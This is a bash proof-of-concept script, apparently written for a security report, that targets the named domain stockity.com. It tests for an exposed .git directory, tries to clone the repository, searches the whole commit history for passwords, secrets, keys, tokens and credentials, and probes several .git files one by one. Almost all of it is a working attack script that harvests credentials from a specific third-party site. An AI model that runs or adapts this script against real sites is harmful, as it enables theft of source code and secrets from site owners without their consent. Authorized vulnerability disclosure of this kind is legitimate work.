#!/bin/bash
# Git Repository Exposure PoC

echo "[*] Testing Git repository exposure on stockity.com"

# Check if .git directory is accessible
curl -s -I https://stockity.com/.git/config | head -n 1

# Clone the repository (simulated)
echo "[*] Attempting to clone Git repository..."
git clone https://stockity.com/.git/ stockity-source 2>&1 | tee git-clone-result.txt

# If successful, extract sensitive information
if [ -d "stockity-source" ]; then
    cd stockity-source
    
    echo "[✓] SUCCESS: Git repository cloned!"
    echo "[*] Repository contents:"
    ls -la
    
    echo "[*] Commit history (sensitive data might be in old commits):"
    git log --oneline --decorate -10
    
    echo "[*] Searching for credentials in commit history:"
    git grep -i "password\|secret\|key\|token\|credential" $(git rev-list --all)
    
    echo "[*] Extracting all branches:"
    git branch -a
    
    echo "[*] Remote configuration:"
    git remote -v
    cat .git/config
    
    cd ..
fi

# Alternative: Direct file access
echo "[*] Testing direct file access:"
for file in config HEAD index logs/HEAD refs/heads/master; do
    echo -n "/.git/$file: "
    curl -s -o /dev/null -w "%{http_code}" https://stockity.com/.git/$file
    echo ""
done
